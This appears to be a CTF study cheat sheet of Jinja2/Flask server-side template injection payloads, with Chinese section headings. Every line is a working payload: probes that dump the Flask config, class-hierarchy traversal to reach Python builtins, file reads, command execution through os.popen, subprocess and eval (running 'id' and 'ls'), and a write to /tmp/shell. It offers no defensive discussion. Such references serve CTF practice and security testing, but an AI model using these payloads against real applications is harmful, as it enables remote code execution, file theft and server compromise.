# SOURCE: /home/xujuan/Des-CTF-Knowledge/Des-CTF-Knowledge-main/PAYLOAD-CHEATSHEET.md
# TITLE: Payload 速查表
# CATEGORY: web

# 基础探测
{{7*7}}                    # 输出49 → 确认SSTI
{{config}}                 # 查看Flask配置
{{config.items()}}         # 遍历配置

# 查看全局类
''.__class__.__mro__[2].__subclasses__()

# 读文件
{{''.__class__.__mro__[2].__subclasses__()[40]('flag').read()}}
{{url_for.__globals__['__builtins__']['open']('flag').read()}}

# 命令执行 — os.popen
{{''.__class__.__mro__[2].__subclasses__()[258]('ls',shell=True,stdout=-1).communicate()[0].strip()}}

# 命令执行 — subprocess.Popen通用版（无需知道索引）
{% for c in [].__class__.__base__.__subclasses__() %}
  {% if c.__name__=='catch_warnings' %}
    {{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('id').read()") }}
  {% endif %}
{% endfor %}

# 命令执行 — eval
{{''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('ls').read()")}}

# 写文件
{{''.__class__.__mro__[1].__subclasses__()[40]('/tmp/shell', 'w').write('content')}}
